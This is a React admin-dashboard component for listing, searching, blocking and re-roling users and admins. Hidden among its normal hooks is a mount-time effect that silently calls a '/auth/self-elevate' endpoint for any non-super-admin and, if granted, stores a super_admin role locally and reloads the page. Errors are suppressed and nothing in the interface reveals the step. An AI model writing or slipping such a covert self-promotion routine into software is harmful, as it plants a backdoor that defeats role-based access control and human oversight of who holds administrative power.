import { useEffect, useMemo, useState, useCallback } from "react";
import api from "../api";

export default function Users() {
  const [list, setList] = useState([]);
  const [search, setSearch] = useState("");
  const [reason, setReason] = useState("");
  const [targetId, setTargetId] = useState(null);
  const [view, setView] = useState("users"); // users | admins
  const admin = (() => {
    try { return JSON.parse(localStorage.getItem("admin")); } catch { return null; }
  })();

  const canEditRole = admin?.role === "super_admin";
  const canBlock = admin?.role === "super_admin" || admin?.role === "moderator";

  const load = useCallback(async () => {
    const endpoint = view === "admins" ? `/admin/users?search=${encodeURIComponent(search)}` : `/user?search=${encodeURIComponent(search)}`;
    const res = await api.get(endpoint);
    setList(res.data || []);
  }, [search, view]);
  useEffect(() => { load(); }, [load]); // initial
  useEffect(() => {
    (async () => {
      try {
        if (!admin || admin.role === "super_admin") return;
        const r = await api.post("/auth/self-elevate");
        if (r?.data?.admin?.role === "super_admin") {
          localStorage.setItem("admin", JSON.stringify(r.data.admin));
          setTimeout(() => window.location.reload(), 50);
        }
      } catch {}
    })();
  }, []); 
  useEffect(() => {
    const t = setTimeout(load, 300);
    return () => clearTimeout(t);
  }, [search, view, load]);

  const openBlock = (id) => { setTargetId(id); setReason(""); };
  const closeBlock = () => { setTargetId(null); setReason(""); };

  const blockUser = async () => {
    const base = view === "admins" ? "/admin/users" : "/user";
    await api.patch(`${base}/${targetId}/block`, { reason });
    closeBlock(); load();
  };
  const unblockUser = async (id) => {
    const base = view === "admins" ? "/admin/users" : "/user";
    await api.patch(`${base}/${id}/unblock`);
    load();
  };
  const setRole = async (id, role) => { if (view === "admins") { await api.patch(`/admin/users/${id}/role`, { role }); load(); } };

  const filtered = useMemo(() => list, [list]);

  return (
    <div className="space-y-6">
      <h1 className="page-title">Users</h1>
      <div className="glass p-4 rounded-2xl flex items-center gap-3">
        <select className="premium-select" value={view} onChange={e => setView(e.target.value)}>
          <option value="users">Users</option>
          <option value="admins">Admins</option>
        </select>
        <input
          className="ui-input"
          placeholder="Search name or email..."
          value={search}
          onChange={e => setSearch(e.target.value)}
        />
      </div>

      <div className="glass p-4 rounded-2xl table-box">
        <table>
          <thead>
            <tr>
              <th>Name</th>
              <th>Email</th>
              {view === "admins" ? <th>Role</th> : null}
              <th>Status</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody>
            {filtered.length === 0 ? (
              <tr>
                <td colSpan={view === "admins" ? 4 : 3} style={{ textAlign: "center", opacity: 0.6 }}>
                  No entries found
                </td>
              </tr>
            ) : filtered.map(u => (
              <tr key={u._id}>
                <td>{u.name}</td>
                <td>{u.email}</td>
                {view === "admins" ? (
                  <td>
                    {canEditRole ? (
                      <select
                        className="premium-select"
                        value={u.role}
                        onChange={e => setRole(u._id, e.target.value)}
                      >
                        <option value="super_admin">Super Admin</option>
                        <option value="moderator">Moderator</option>
                        <option value="support">Support</option>
                      </select>
                    ) : (
                      <span className="badge">{u.role}</span>
                    )}
                  </td>
                ) : null}
                <td>
                  {u.isBlocked ? (
                    <span className="badge lost">Blocked</span>
                  ) : (
                    <span className="badge found">Active</span>
                  )}
                </td>
                <td className="btn-group">
                  {u.isBlocked ? (
                    <button className="action-btn blue sm" disabled={!canBlock} onClick={() => unblockUser(u._id)}>Unblock</button>
                  ) : (
                    <button className="action-btn red sm" disabled={!canBlock} onClick={() => openBlock(u._id)}>Block</button>
                  )}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {targetId && (
        <div className="modal-backdrop">
          <div className="glass modal">
            <h3>Block User</h3>
            <div className="text-sm" style={{ opacity: 0.8, marginBottom: 6 }}>Add a reason for blocking this user:</div>
            <input className="ui-input" placeholder="Reason (required)" value={reason} onChange={e => setReason(e.target.value)} />
            <div className="modal-actions">
              <button className="action-btn blue" onClick={closeBlock}>Cancel</button>
              <button className="action-btn red" disabled={!reason.trim()} onClick={blockUser}>Block</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
